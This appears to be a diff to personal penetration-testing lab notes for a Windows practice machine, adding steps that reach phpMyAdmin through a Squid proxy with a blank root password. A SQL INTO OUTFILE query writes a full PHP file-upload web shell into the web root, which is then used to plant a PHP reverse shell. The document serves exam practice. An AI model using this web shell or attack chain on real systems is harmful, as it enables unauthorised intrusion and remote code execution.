@@ -49,6 +49,59 @@ OS build: '17763'
 ---
 ## Steps to User.txt
 
+[[3128 Squid Proxy]]
+
+Squid 4.14 found
+
+Port 3128 Squid requires port scanning
+
+port 8080 found
+
+add 3128 squid to foxyproxy, access 8080
+
+gives access to a wampserver hub page
+
+phpmyadmin link shows login page
+
+root:[blank] is the password
+
+Clicking on top left tiny question mark icon gives version number
+
+phpmyadmin 5.0.2
+
+Click on SQL tab
+
+paste this
+
+```
+SELECT  
+"<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"  
+INTO OUTFILE 'C:/wamp/www/uploader.php';
+```
+
+This creates uploader.php
+
+Go to this page
+
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
+
+const command = `http://${ip}:8080/uploader.php`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+Upload reverse shell.php. Only Ivan Sincek script works https://www.revshells.com/
+
+go to the page
+
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";
+
+const command = `http://${ip}:8080/phpreverseshell.php`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+
 ---
 ## Steps to root.txt
 
